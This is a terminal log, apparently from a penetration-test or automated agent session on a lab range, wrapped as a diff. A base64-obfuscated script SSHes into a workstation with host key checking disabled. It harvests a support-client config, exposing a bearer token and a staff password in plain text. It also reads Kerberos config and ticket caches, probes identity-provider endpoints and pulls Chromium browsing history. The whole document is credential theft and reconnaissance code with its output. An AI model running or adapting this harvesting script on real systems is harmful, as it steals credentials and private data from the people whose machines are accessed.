@@ -1,0 +1,113 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r4.sh <<'B64EOF'
+> IyEvYmluL2Jhc2gKc2V0ICtlCnNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBDb25uZWN0VGltZW91dD0xMCByb3dhbi1kZXYgJ2Jhc2ggLXMnIDw8J1JTSCcKc2V0ICtlCkNBPSRIT01FLy5sb2NhbC9zaGFyZS9rZXBsZXJvcHMvY2EuY3J0CmVjaG8gIiMjIyMjIyBIT01FIENPTkZJRy9MT0NBTCIKbHMgLWxhIH4vLmNvbmZpZyB+Ly5sb2NhbC9zaGFyZS9rZXBsZXJvcHMgfi8uY29uZmlnL2ZpZWxkbGluayAyPiYxCmVjaG8gIiMjIyMjIyBzdXBwb3J0LWNsaWVudC5qc29uIgpjYXQgfi8uY29uZmlnL2ZpZWxkbGluay9zdXBwb3J0LWNsaWVudC5qc29uIDI+JjEKZWNobyAiIyMjIyMjIGtlcGxlcm9wcyBkaXIgZmlsZXMiCmZvciBmIGluIH4vLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy8qOyBkbyBlY2hvICItLS0gJGYiOyBmaWxlICIkZiI7IGhlYWQgLWMgNDAwICIkZiIgMj4vZGV2L251bGw7IGVjaG87IGRvbmUKZWNobyAiIyMjIyMjIGtlcmJlcm9zIGNvbmZpZyArIGtleXRhYnMiCmNhdCAvZXRjL2tyYjUuY29uZiAyPiYxIHwgaGVhZCAtNjAKbHMgLWxhIH4vKi5rZXl0YWIgfi8uY29uZmlnLyoua2V5dGFiIC9ldGMvKi5rZXl0YWIgMj4mMQprbGlzdCAyPiYxIHwgaGVhZCAtMjAKd2hpY2gga2luaXQga2xpc3Qga3ZubyAyPiYxCmVjaG8gIiMjIyMjIyBpZGVudGl0eSByZWFsbSIKZm9yIHUgaW4gImh0dHBzOi8vaWRlbnRpdHkua2VwbGVyb3BzLnRlc3QvcmVhbG1zL2tlcGxlcm9wcy8ud2VsbC1rbm93bi9vcGVuaWQtY29uZmlndXJhdGlvbiIgImh0dHBzOi8vaWRlbnRpdHkua2VwbGVyb3BzLnRlc3QvcmVhbG1zL2tlcGxlcm9wcyIgImh0dHBzOi8vaWRlbnRpdHkua2VwbGVyb3BzLnRlc3QvcmVhbG1zL2tlcGxlcm9wcy9wcm90b2NvbC9vcGVuaWQtY29ubmVjdC90b2tlbiIgImh0dHBzOi8vaWQua2VwbGVyb3BzLnRlc3QvcmVhbG1zL2tlcGxlcm9wcy8ud2VsbC1rbm93bi9vcGVuaWQtY29uZmlndXJhdGlvbiI7IGRvCiAgZWNobyAiLS0tICR1IjsgY3VybCAtc1MgLW0gMTAgLS1jYWNlcnQgJENBIC1vIC90bXAvaWQgLXcgJ1sle2h0dHBfY29kZX1dXG4nICIkdSI7IGhlYWQgLWMgODAwIC90bXAvaWQ7IGVjaG8KZG9uZQplY2hvICIjIyMjIyMgY2hyb21pdW0gaGlzdG9yeSIKREI9fi8uY29uZmlnL2Nocm9taXVtL0RlZmF1bHQKbHMgLWxhICREQiAyPiYxIHwgaGVhZCAtMjAKY3AgIiREQi9IaXN0b3J5IiAvdG1wL2guZGIgMj4vZGV2L251bGwgJiYgc3FsaXRlMyAvdG1wL2guZGIgInNlbGVjdCB1cmwsdGl0bGUgZnJvbSB1cmxzIG9yZGVyIGJ5IGxhc3RfdmlzaXRfdGltZSBkZXNjIGxpbWl0IDQwOyIgMj4mMSB8IGhlYWQgLTUwClJTSAplY2hvIERPTkVfUjQK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r4.sh; bash /tmp/r4.sh; echo DONEMARK_1795199966057$((6*7))
+###### HOME CONFIG/LOCAL
+/home/rowan/.config:
+total 20
+drwx------  5 rowan rowan 4096 Nov 19 07:11 .
+drwx------ 13 rowan rowan 4096 Nov 20 18:32 ..
+drwx------  3 rowan rowan 4096 Nov 19 07:11 chromium
+drwx------  2 rowan rowan 4096 Nov 19 07:11 fieldlink
+drwx------  2 rowan rowan 4096 Nov 20 18:35 git
+
+/home/rowan/.config/fieldlink:
+total 12
+drwx------ 2 rowan rowan 4096 Nov 19 07:11 .
+drwx------ 5 rowan rowan 4096 Nov 19 07:11 ..
+-rw------- 1 rowan rowan  459 Nov 19 07:11 support-client.json
+
+/home/rowan/.local/share/keplerops:
+total 16
+drwxr-xr-x 2 rowan rowan 4096 Nov 19 07:11 .
+drwxr-xr-x 3 rowan rowan 4096 Nov 19 07:11 ..
+-r--r--r-- 1 root  root  1505 Nov 19 07:11 ca.crt
+-rw-r--r-- 1 rowan rowan    0 Nov 19 03:07 connector-archive-2026-09-18
+-r--r--r-- 1 root  root   704 Nov 19 07:11 enrollment-ca.crt
+-rw-r--r-- 1 rowan rowan    0 Nov 19 03:07 policy-compiler-2026-09-18
+-rw-r--r-- 1 rowan rowan    0 Nov 19 03:07 registry-foundation-2026-09-18
+-rw-r--r-- 1 rowan rowan    0 Nov 19 03:07 release-lineage-2026-09-18
+###### support-client.json
+{"service_url": "https://support.keplerops.test:8443", "principal": "rowan.ito", "authorization": "Bearer fk_support_rowan_2fxtXNkUjKMbcvPBlAot0Jp0vVNppL9b", "ca_file": "/home/rowan/.local/share/keplerops/ca.crt", "retained_staff_login": {"url": "https://support.keplerops.test/scp/", "username": "maya.ranscombe", "password": "sWQa31085FTQekZhHTxUyf_9E1marq0ur8WNCKmTtnk", "note": "Retained support-desk staff login left in the shared workstation profile."}}###### keplerops dir files
+--- /home/rowan/.local/share/keplerops/ca.crt
+bash: line 8: file: command not found
+-----BEGIN CERTIFICATE-----
+MIIEKzCCApOgAwIBAgIUaKA4FNkvM6TT+wVaugcPiGTSGk0wDQYJKoZIhvcNAQEL
+BQAwHTEbMBkGA1UEAwwSS2VwbGVyT3BzIFJhbmdlIENBMB4XDTI2MTExOTA3MDYy
+MloXDTM2MTExNjA3MDYyMlowHTEbMBkGA1UEAwwSS2VwbGVyT3BzIFJhbmdlIENB
+MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAyPy7TIizta1I7OhKQLDS
+9s1fJNBuTxqMIwKxuNC9fzibpp025sCNwZ/qqkPupKfvsEBBn70dA4oOSH6HY3RV
+X/0fWeK3Kr/zhAuxxHKKwew4Kw9CqRGlbJRl3rcEKgmkQON
+--- /home/rowan/.local/share/keplerops/connector-archive-2026-09-18
+bash: line 8: file: command not found
+
+--- /home/rowan/.local/share/keplerops/enrollment-ca.crt
+bash: line 8: file: command not found
+-----BEGIN CERTIFICATE-----
+MIIB3DCCAYKgAwIBAgIRAN/zqHtc6w8UvxJTEfQDvNwwCgYIKoZIzj0EAwIwTDEg
+MB4GA1UEChMXRmllbGRLZXN0IEVucm9sbG1lbnQgQ0ExKDAmBgNVBAMTH0ZpZWxk
+S2VzdCBFbnJvbGxtZW50IENBIFJvb3QgQ0EwHhcNMjYxMTE5MDcwNjI3WhcNMzYx
+MTE2MDcwNjI3WjBMMSAwHgYDVQQKExdGaWVsZEtlc3QgRW5yb2xsbWVudCBDQTEo
+MCYGA1UEAxMfRmllbGRLZXN0IEVucm9sbG1lbnQgQ0EgUm9vdCBDQTBZMBMGByqG
+SM49AgEGCCqGSM49AwEHA0IABJ+4Vf/yHlsWYzn5/sPx8Mc
+--- /home/rowan/.local/share/keplerops/policy-compiler-2026-09-18
+bash: line 8: file: command not found
+
+--- /home/rowan/.local/share/keplerops/registry-foundation-2026-09-18
+bash: line 8: file: command not found
+
+--- /home/rowan/.local/share/keplerops/release-lineage-2026-09-18
+bash: line 8: file: command not found
+
+###### kerberos config + keytabs
+[libdefaults]
+ default_realm = KEPLEROPS.TEST
+ dns_lookup_kdc = false
+ dns_lookup_realm = false
+ rdns = false
+ forwardable = true
+ udp_preference_limit = 1
+ ticket_lifetime = 10h
+
+[realms]
+ KEPLEROPS.TEST = {
+  kdc = kerberos.keplerops.test:88
+ }
+
+[domain_realm]
+ .keplerops.test = KEPLEROPS.TEST
+ keplerops.test = KEPLEROPS.TEST
+ls: cannot access '/home/rowan/*.keytab': No such file or directory
+ls: cannot access '/home/rowan/.config/*.keytab': No such file or directory
+ls: cannot access '/etc/*.keytab': No such file or directory
+klist: No credentials cache found (filename: /tmp/krb5cc_2000)
+/usr/bin/kinit
+/usr/bin/klist
+/usr/bin/kvno
+###### identity realm
+--- https://identity.keplerops.test/realms/keplerops/.well-known/openid-configuration
+[200]
+{"issuer":"https://identity.keplerops.test/realms/keplerops","authorization_endpoint":"https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/auth","token_endpoint":"https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/token","introspection_endpoint":"https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/token/introspect","userinfo_endpoint":"https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/userinfo","end_session_endpoint":"https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/logout","frontchannel_logout_session_supported":true,"frontchannel_logout_supported":true,"jwks_uri":"https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/certs","check_session_iframe":"https://iden
+--- https://identity.keplerops.test/realms/keplerops
+[200]
+{"realm":"keplerops","public_key":"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA7VRjZ1KSQ3TxC3QTHO/C0tZehy09Ewap3j7v+IMWL06nJn0ekHcy0mPNReA57SxmcIuiXy/ARfPfAx4q8x0gil+58WpEehc19nFPPX9xv35obAzOeAw4PZ9H80q1juyyHQS/yo3Kjf81BOP6t9hLb3WQCMcMoE1y6Wpsj/T5HYawS5E1JNpXRESphc7KBuXrm1nFmvDANoPIsWYkNp+dtIlcdR5YPJS4gt4uxwOoXiIVvtBYqzGHFoqjIK2X+TNcsk0cPGBwXLHVzMxtSAQVZUmoYmL0MZ44fNl8FJwTZL3RpOkJq6A8hWBL3jiGa/ArJ6fvDlPmpupzp2tpHTtRbwIDAQAB","token-service":"https://identity.keplerops.test/realms/keplerops/protocol/openid-connect","account-service":"https://identity.keplerops.test/realms/keplerops/account","tokens-not-before":0}
+--- https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/token
+[405]
+{"error":"HTTP 405 Method Not Allowed"}
+--- https://id.keplerops.test/realms/keplerops/.well-known/openid-configuration
+[200]
+{"issuer":"https://identity.keplerops.test/realms/keplerops","authorization_endpoint":"https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/auth","token_endpoint":"https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/token","introspection_endpoint":"https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/token/introspect","userinfo_endpoint":"https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/userinfo","end_session_endpoint":"https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/logout","frontchannel_logout_session_supported":true,"frontchannel_logout_supported":true,"jwks_uri":"https://identity.keplerops.test/realms/keplerops/protocol/openid-connect/certs","check_session_iframe":"https://iden
+###### chromium history
+total 52
+drwx------ 2 rowan rowan  4096 Nov 19 07:11 .
+drwx------ 3 rowan rowan  4096 Nov 19 07:11 ..
+-rw------- 1 rowan rowan 20480 Nov 19 07:11 Cookies
+-rw------- 1 rowan rowan 20480 Sep 18 11:00 History
+-rw------- 1 rowan rowan   202 Sep 18 11:00 Preferences
+https://support.keplerops.test/scp/tickets.php|SUP-2841 · ARWC connector callback latency · FieldKest Support
+DONE_R4
